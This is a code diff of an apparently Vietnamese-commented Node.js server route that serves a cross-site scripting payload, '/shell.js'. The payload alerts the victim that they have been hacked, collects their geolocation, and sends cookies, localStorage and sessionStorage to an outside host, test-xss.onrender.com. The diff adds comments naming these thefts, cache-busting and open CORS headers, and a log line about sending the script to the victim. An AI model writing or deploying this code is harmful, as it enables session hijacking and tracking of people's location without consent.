@@ -166,6 +166,7 @@ app.get("/shell.js", (req, res) => {
   const shellJS = `
     alert("Bạn đã bị hack!");
 
+    // Lấy vị trí địa lý của nạn nhân
     navigator.geolocation.getCurrentPosition((position) => {
       fetch("https://test-xss.onrender.com/location", {
         method: "POST",
@@ -177,6 +178,7 @@ app.get("/shell.js", (req, res) => {
       });
     });
 
+    // Đính kèm lấy cookie + localStorage + sessionStorage
     fetch("https://test-xss.onrender.com/stolen-data", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -188,9 +190,17 @@ app.get("/shell.js", (req, res) => {
     });
   `;
 
+  // Set headers chuẩn chỉnh
   res.setHeader("Content-Type", "application/javascript");
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+  res.setHeader("Pragma", "no-cache");
+  res.setHeader("Expires", "0");
+
+  console.log("📡 Gửi shell.js cho nạn nhân!");
   res.send(shellJS);
 });
+
 
 // Route nhận dữ liệu vị trí của nạn nhân
 app.post("/location", (req, res) => {
